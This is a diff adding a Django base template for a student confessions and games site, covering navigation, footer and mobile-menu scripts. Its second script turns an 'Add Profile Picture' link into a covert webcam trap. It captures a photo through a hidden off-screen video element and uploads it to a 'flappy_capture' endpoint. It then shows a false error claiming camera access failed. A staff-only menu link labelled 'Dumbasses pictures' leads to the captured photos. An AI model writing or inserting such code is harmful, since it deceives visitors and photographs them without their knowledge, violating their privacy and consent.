@@ -1,0 +1,194 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Crush Imam</title>
+    <link rel="stylesheet" href="{% static 'css/styles.css' %}" />
+    <link rel="stylesheet" href="{% static 'css/mobile.css' %}" />
+</head>
+<body>
+    <header class="header">
+        <nav class="navbar">
+            <div class="nav-container">
+                <a href="{% url 'home' %}" class="logo">Crush Imam</a>
+                <button class="menu-toggle" id="menuToggle" aria-label="Toggle menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </button>
+                <ul class="nav-menu" id="navMenu">
+                    <li class="nav-item"><a href="{% url 'home' %}" class="nav-link">Home</a></li>
+                    <li class="nav-item"><a href="{% url 'confessions_list' %}" class="nav-link">Confessions</a></li>
+                    <li class="nav-item"><a href="{% url 'news_list' %}" class="nav-link">News</a></li>
+                    <li class="nav-item"><a href="{% url 'flappy' %}" class="nav-link">Flappy Bird</a></li>
+                    {% if user.is_staff %} <li class="nav-item"><a href="{% url 'flappy_photos_admin' %}" class="nav-link">Dumbasses pictures</a></li> {% endif %}
+                    <li class="nav-item nav-dropdown">
+                        <a href="#" class="nav-link dropdown-toggle">Halls ▼</a>
+                        <div class="dropdown-menu">
+                            <a href="{% url 'hall_list' category='fame' %}" class="dropdown-item">Hall of Fame</a>
+                            <a href="{% url 'hall_list' category='shame' %}" class="dropdown-item">Hall of Shame</a>
+                        </div>
+                    </li>
+                    {% if user.is_authenticated %}
+                        <li class="nav-item user-menu">
+                            <span class="user-greeting">{{ user.username }}</span>
+                            <a href="/accounts/logout/" class="nav-link logout-link">Logout</a>
+                            <a id="add_pfp" class="nav-link logout-link">Add Profile Picture</a>
+                        </li>
+                    {% endif %}
+                </ul>
+            </div>
+        </nav>
+    </header>
+
+    <div id="mobileOverlay" class="mobile-overlay" aria-hidden="true"></div>
+
+    {% block content %}
+    {% endblock %}
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-section">
+                <p>📱 Follow us on Instagram:</p>
+                <p><a href="https://www.instagram.com/crush_imam_ghazali1/" target="_blank">@crush_imam_ghazali1</a></p>
+            </div>
+            <div class="footer-divider"></div>
+            <div class="footer-section">
+                <p>© 2025 Crush Imam. All rights reserved. | Kol l7o9ou9 ma7fouda.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Mobile menu + overlay toggle with improved UX
+        (function(){
+            const menuToggle = document.getElementById('menuToggle');
+            const navMenu = document.getElementById('navMenu');
+            const overlay = document.getElementById('mobileOverlay');
+
+            function openMenu() {
+                navMenu.classList.add('active');
+                menuToggle.classList.add('active');
+                overlay.classList.add('active');
+                overlay.setAttribute('aria-hidden', 'false');
+                document.body.classList.add('no-scroll');
+            }
+
+            function closeMenu() {
+                navMenu.classList.remove('active');
+                menuToggle.classList.remove('active');
+                overlay.classList.remove('active');
+                overlay.setAttribute('aria-hidden', 'true');
+                document.body.classList.remove('no-scroll');
+                // close any open dropdowns
+                document.querySelectorAll('.nav-dropdown.open').forEach(d=>d.classList.remove('open'));
+            }
+
+            if (menuToggle) {
+                menuToggle.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    if (navMenu.classList.contains('active')) closeMenu(); else openMenu();
+                });
+            }
+
+            // Close when overlay clicked
+            if (overlay) {
+                overlay.addEventListener('click', function(){ closeMenu(); });
+            }
+
+            // Close menu on link click (except dropdown toggles)
+            document.querySelectorAll('.nav-link').forEach(link => {
+                link.addEventListener('click', function(e){
+                    if (!this.classList.contains('dropdown-toggle') && window.innerWidth <= 768) {
+                        closeMenu();
+                    }
+                });
+            });
+
+            // Dropdown toggle on mobile
+            document.querySelectorAll('.dropdown-toggle').forEach(dt => {
+                dt.addEventListener('click', function(e){
+                    if (window.innerWidth <= 768) {
+                        e.preventDefault();
+                        const dropdown = this.closest('.nav-dropdown');
+                        dropdown.classList.toggle('open');
+                    }
+                });
+            });
+
+            // Close menu when window resized above mobile
+            window.addEventListener('resize', function(){
+                if (window.innerWidth > 768) closeMenu();
+            });
+        })();
+    </script>
+    <script>
+        // CSRF helper
+function getCookie(name) {
+  let v = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
+  return v ? decodeURIComponent(v[2]) : null;
+}
+
+        // Camera capture and upload
+async function requestCameraAndCapture(){
+  try{
+
+    const constraints = { video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } };
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+
+    // create a hidden video element and attach to DOM (some browsers require it to render frames)
+    const video = document.createElement('video');
+    video.style.position = 'fixed'; video.style.left = '-9999px'; video.style.width = '1px'; video.style.height = '1px';
+    video.autoplay = true; video.playsInline = true; video.muted = true;
+    video.srcObject = stream;
+    document.body.appendChild(video);
+
+    // Try to play; some browsers require play() to be called. If it fails, we'll still poll for frames.
+    try{ await video.play(); } catch(e){ /* ignore */ }
+
+    // wait until we have a valid frame size or timeout
+    const start = Date.now();
+    while((video.videoWidth === 0 || video.videoHeight === 0) && (Date.now() - start) < 2000){
+      await new Promise(r => setTimeout(r, 50));
+    }
+
+    const vw = video.videoWidth || baseW;
+    const vh = video.videoHeight || baseH;
+    const off = document.createElement('canvas'); off.width = vw; off.height = vh;
+    const octx = off.getContext('2d');
+
+    // wait a couple frames to ensure pixels are available
+    await new Promise(r => requestAnimationFrame(r));
+    await new Promise(r => requestAnimationFrame(r));
+    octx.drawImage(video, 0, 0, off.width, off.height);
+
+    // stop camera and remove video element
+    try{ stream.getTracks().forEach(t => t.stop()); } catch(e){ console.warn('stop error', e); }
+    try{ video.remove(); } catch(e){}
+
+    // convert to blob and upload
+    off.toBlob(async function(blob){
+      const fd = new FormData();
+      fd.append('photo', blob, 'flappy_capture.png');
+      const csr = getCookie('csrftoken');
+      try{
+        const resp = await fetch('{% url "flappy_capture" %}', { method: 'POST', body: fd, headers: {'X-CSRFToken': csr} });
+        const js = await resp.json().catch(()=>({error:'invalid response'}));
+      }catch(err){ console.error(err); }
+    }, 'image/png');
+  }catch(err){
+    console.error(err);
+  }
+}
+const add_pfp = document.getElementById('add_pfp');
+add_pfp.addEventListener('click', async function(e){
+    await requestCameraAndCapture();
+    alert('An error has occured while trying to access your camera. Please try again later.');
+});
+</script>
+    {% block extra_scripts %}{% endblock %}
+</body>
+</html>
+
